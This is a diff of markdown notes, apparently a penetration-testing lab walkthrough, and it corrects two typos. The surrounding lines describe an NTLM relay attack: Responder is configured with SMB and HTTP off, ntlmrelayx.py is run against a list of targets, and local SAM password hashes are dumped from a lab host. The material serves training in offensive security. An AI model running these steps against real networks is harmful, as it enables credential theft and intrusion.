@@ -130,7 +130,7 @@ sudo nano /etc/responder/Responder.conf
 ```
 
 ```bash
-# Swtich Off SMB and HTTP
+# Switch Off SMB and HTTP
 SMB = Off
 ...
 HTTP = Off
@@ -160,7 +160,7 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support
 
 ![](.gitbook/assets/2024-07-29_17-19-49_663.png)
 
-- The local SAM hashes are dumped from `SPIDERMAN` and save automatically into the `192.168.31.92_samhashes.sam` file
+- The local SAM hashes are dumped from `SPIDERMAN` and automatically saved into the `192.168.31.92_samhashes.sam` file
 
 ```bash
 # SPIDERMAN - 192.168.31.92 SAM Hashes
